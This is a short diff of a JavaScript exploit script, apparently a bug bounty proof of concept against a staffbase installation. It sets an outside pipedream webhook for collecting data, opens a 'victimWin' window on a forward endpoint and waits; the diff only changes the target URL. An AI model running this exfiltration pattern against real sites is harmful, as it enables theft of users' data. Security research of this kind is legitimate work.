@@ -1,7 +1,7 @@
 (async function() {
     var webhook = "https://eoeqgca83zpr7tb.m.pipedream.net/";
 
-    var victimWin = window.open("https://hackerone2.staffbase.rocks/api/installations/69877fae9c38bf4b2f40bdb9/service/frontend/forward?locale=en_US&link=%3Ffrontend%3Dtrue");
+    var victimWin = window.open("https://hackerone1.staffbase.rocks/api/installations/697dfe04217642523194b1a6/service/frontend/forward?locale=en_US&link=%3Ffrontend%3Dtrue");
 
 	await new Promise(r => setTimeout(r, 2000));
 
